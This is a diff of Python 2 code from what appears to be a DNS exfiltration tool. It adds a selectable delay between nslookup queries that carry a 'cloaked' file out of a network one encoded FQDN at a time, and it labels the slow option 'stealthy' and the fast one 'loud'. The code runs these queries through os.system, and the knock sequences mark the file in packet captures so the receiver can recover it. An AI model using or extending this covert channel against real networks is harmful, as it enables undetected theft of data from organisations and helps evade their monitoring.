@@ -125,21 +125,45 @@ def CloakAndTransferFile():
 
 	if choice == "y":
 
+		queryDelay = 0.5
+
+		print ""
+		print "Select time delay between DNS queries:"
+		print ""
+		print "1) Half-Second (Recommended, slow but reliable)"
+		print "2) 5 Seconds (Extremely slow but stealthy)"
+		print "3) No delay (Fast but loud, risks corrupting payload)"
+		print ""
+
+		try:
+			delayChoice = int( raw_input( "Selection (default = 1): " ))
+
+			if delayChoice == 2:
+				queryDelay = 5.0
+
+			if delayChoice == 3:
+				queryDelay = 0.0
+
+		except ValueError:
+
+			queryDelay = 0.5
+
+
 		### Send knock sequence if Common FQDN cipher used
 		### Signals beginning of cloaked file in pcap (need source's IP address)
 
 		if ( gCommonFQDNCipherSelected == True ):
 
-			TransferCloakedFile( gKnockSequenceFilename )
+			TransferCloakedFile( gKnockSequenceFilename, queryDelay )
 
-		TransferCloakedFile( cloakedFile )
+		TransferCloakedFile( cloakedFile, queryDelay )
 
 		### Send knock sequence if Common FQDN cipher used
 		### Signals end of cloaked file in pcap
 
 		if ( gCommonFQDNCipherSelected == True ):
 
-			TransferCloakedFile( gKnockSequenceFilename )
+			TransferCloakedFile( gKnockSequenceFilename, queryDelay )
 
 	choice = raw_input( "Press return to continue... " )
 	print ""
@@ -462,7 +486,7 @@ def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):
 
 #========================================================================
 #
-# TransferCloakedFile( cloakedFile )
+# TransferCloakedFile( cloakedFile, queryDelay )
 #
 # Generates sequential DNS queries for each FQDN in the Cloaked file.
 #
@@ -472,7 +496,7 @@ def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):
 #
 #========================================================================
 
-def TransferCloakedFile( cloakedFile ):
+def TransferCloakedFile( cloakedFile, queryDelay ):
 
 	print ""
 	print "Broadcasting file..."
@@ -482,7 +506,7 @@ def TransferCloakedFile( cloakedFile ):
 	print "### Starting Time (UTC): " + mDateTimeUTC.strftime( "%x %X" )
 	print ""
 
-	status = GenerateDNSQueries( cloakedFile )
+	status = GenerateDNSQueries( cloakedFile,  queryDelay )
 
 	mDateTimeUTC = datetime.datetime.utcnow()
 
@@ -496,7 +520,7 @@ def TransferCloakedFile( cloakedFile ):
 
 #========================================================================
 #
-# GenerateDNSQueries( cloakedFile )
+# GenerateDNSQueries( cloakedFile, queryDelay )
 #
 # Leverages nslookup on host OS. Seems lazy, and is, but also lets us 
 # leverage nslookup's implementation which has consistent behavior across
@@ -513,7 +537,7 @@ def TransferCloakedFile( cloakedFile ):
 #
 #========================================================================
 
-def GenerateDNSQueries( cloakedFile ):
+def GenerateDNSQueries( cloakedFile, queryDelay ):
 
 	tmpAddrStr = ""
 	byteCount = 0
@@ -533,10 +557,10 @@ def GenerateDNSQueries( cloakedFile ):
 				commandStr = "nslookup " + fqdnStr + " >/dev/null 2>&1"
 				os.system( commandStr )
 
-				time.sleep( 0.500 )   # 0.5 second delay between DNS queries
+				time.sleep( queryDelay )   
 		
 			except:
-				time.sleep( 0.500 )   # 0.5 second delay between DNS queries
+				time.sleep( queryDelay )  
 
 
 			checkpoint = byteCount % 25
